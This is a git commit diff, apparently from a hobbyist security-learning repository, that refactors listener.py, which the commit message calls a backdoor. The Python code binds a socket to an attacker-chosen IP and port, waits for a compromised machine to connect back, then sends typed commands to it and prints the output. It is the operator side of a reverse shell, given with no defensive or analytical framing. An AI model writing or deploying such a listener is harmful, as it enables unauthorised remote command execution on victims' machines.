ab273990a5724b2ae67546e3b9f51fedc69a42cf
Shivam Singh <dreamyshivam01@gmail.com>
2025-03-27 23:45:02 +0530

    A backdoor for listening and executing system commands

--- listener.py
+++ listener.py
@@ -1,15 +1,24 @@
 import socket
 
-listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-listener.bind(("hackers ip" , open_port_no ))
-listener.listen(0)
-print("[+] Waiting for incoming connection")
-connection , address = listener.accept()
-print("[+] Connection established from " + str(address))
+class Listener:
+    def __init__(self, ip, port):
+        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        listener.bind((ip, port))
+        listener.listen(0)
+        print("[+] Waiting for incoming connection")
+        self.connection , address = listener.accept()
+        print("[+] Connection established from " + str(address))
 
-while True:
-    command = input(">> ")
-    connection.send(command.encode())
-    result = connection.recv(1024).decode()
-    print(result)
+    def execute_remotely(self, command):
+        self.connection.send(command.encode())
+        return self.connection.recv(1024).decode()
+
+    def run(self):
+        while True:
+            command = input(">> ")
+            result = self.execute_remotely(command)
+            print(result)
+
+my_listener = Listener("ip" , "port")
+my_listener.run()
